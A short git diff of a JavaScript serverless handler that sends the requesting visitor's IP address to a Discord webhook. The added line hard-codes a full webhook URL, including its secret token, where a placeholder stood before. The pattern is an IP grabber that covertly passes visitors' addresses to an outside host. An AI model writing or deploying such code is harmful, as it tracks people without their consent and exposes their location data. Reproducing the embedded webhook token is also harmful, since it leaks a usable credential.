@@ -9,7 +9,7 @@ export default async function handler(request) {
             "Unknown";
 
         // PUT YOUR NEW DISCORD WEBHOOK HERE
-        const webhook = "PASTE_YOUR_NEW_WEBHOOK_HERE";
+        const webhook = "https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW";
 
         // Send IP to Discord
         const discordResponse = await fetch(webhook, {
